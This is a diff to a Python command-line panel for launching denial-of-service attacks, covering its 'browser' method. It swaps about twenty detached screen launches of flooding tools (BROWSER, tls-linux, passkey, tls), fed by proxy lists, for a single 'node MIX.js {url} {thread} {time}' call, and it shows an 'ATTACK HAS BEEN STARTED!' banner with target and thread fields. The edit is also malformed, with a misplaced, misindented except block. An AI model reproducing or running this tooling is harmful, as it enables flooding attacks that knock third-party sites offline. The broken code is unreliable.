@@ -760,28 +760,13 @@ def main():
 			    main()			    
 		elif sinput == "browser" or sinput == "BROWSER":
 			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
+				url = sin.split()[1]
+				thread = sin.split()[2]
 				time = sin.split()[3]
-				os.system(f'cd .BF && screen -dm ./BROWSER {host} {time} 64 10')
-				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
-				os.system(f'cd .BF && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd .BF2 && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd .BF3 && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd .BF3 && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
-				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
-				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 3 500')	
-				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 5 500')
-				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
-				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
-				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
-				os.system(f'cd /media && screen -dm ./BROWSER {host} {time} 64 10')
-				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
-				os.system(f'cd /media && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd /media && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd /media && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd /media && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')	
+				os.system(f'node MIX.js {url} {thread} {time}')
+            except IndexError:
+                print('Usage: browser <url> <thread> <time>')
+                print('Example: browser http://example.com 500 60')	
 				os.system ("clear")
 				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
@@ -790,9 +775,9 @@ def main():
 \033[1;37m                            ATTACK HAS BEEN STARTED!
 \033[35m                ╚╦════════════════════════════════════════════╦╝
 \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
+\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
+\033[1;37m                THREAD     : \033[35m[ \033[1;37m{thread} \033[35m]
 \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
 \033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
 \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
 \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
